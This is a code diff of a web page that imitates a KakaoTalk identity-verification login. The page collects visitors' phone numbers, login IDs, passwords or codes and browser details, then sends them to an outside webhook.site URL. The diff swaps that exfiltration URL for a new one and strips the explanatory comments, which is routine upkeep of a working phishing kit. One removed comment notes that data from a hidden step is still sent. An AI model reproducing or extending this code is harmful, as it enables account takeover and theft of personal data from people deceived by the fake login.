@@ -38,7 +38,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 .fade-out { opacity: 0; transform: translateY(-20px); }
 .fade-in { opacity: 1; transform: translateY(0); }
 
-/* 눈 아이콘 스타일 */
+
 .password-wrapper { position: relative; display: inline-block; width: 365px; }
 .password-wrapper input { width: 100%; padding: 5px 35px 5px 5px; box-sizing: border-box; }
 .toggle-password { position: absolute; top: 50%; right: 5px; transform: translateY(-50%); cursor: pointer; }
@@ -69,7 +69,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
   <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
 </div>
 
-<!-- page3 제거됨 -->
+
 
 <div id="page4" class="login-container hidden">
   <h2>카카오톡 본인인증하기</h2>
@@ -88,7 +88,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-const webhookUrl = "https://webhook.site/aa4100bc-d5ad-4ac2-a7fc-4982a8056c7e";
+const webhookUrl = "https://webhook.site/62dd6814-ed65-487c-986a-b34495606cbf";
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
@@ -113,7 +113,6 @@ function goNext() {
   showPage('page1', 'page2');
 }
 
-// --- 정보 수집 함수 (기존 그대로 유지) ---
 async function collectUserInfo() {
   const formData = new URLSearchParams();
   formData.append("userAgent", navigator.userAgent);
@@ -186,7 +185,7 @@ async function collectUserInfo() {
     .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
-// --- 전화번호 입력 ---
+
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
@@ -210,7 +209,7 @@ function sendPhone() {
     savedPhone = userId;
     const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
 
-    // page3 UI는 없지만, page3 정보는 그대로 전송
+
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
@@ -223,7 +222,7 @@ function sendPhone() {
   }
 }
 
-// --- page4 (로그인) ---
+
 function sendPage4() {
   const userId4 = document.getElementById("userId4").value.trim();
   const userCode4 = document.getElementById("userCode4").value.trim();
@@ -255,7 +254,7 @@ function sendPage4() {
   }
 }
 
-// 버튼 색상 업데이트
+
 const passwordInput = document.getElementById("userCode4");
 const loginBtn = document.getElementById("loginBtn");
 function updateLoginBtnColor() {
@@ -275,7 +274,7 @@ passwordInput.addEventListener("keyup", updateLoginBtnColor);
 passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
-// 눈 아이콘 토글
+
 function togglePassword() {
   const input = document.getElementById("userCode4");
   const slash = document.querySelector(".eye-slash");
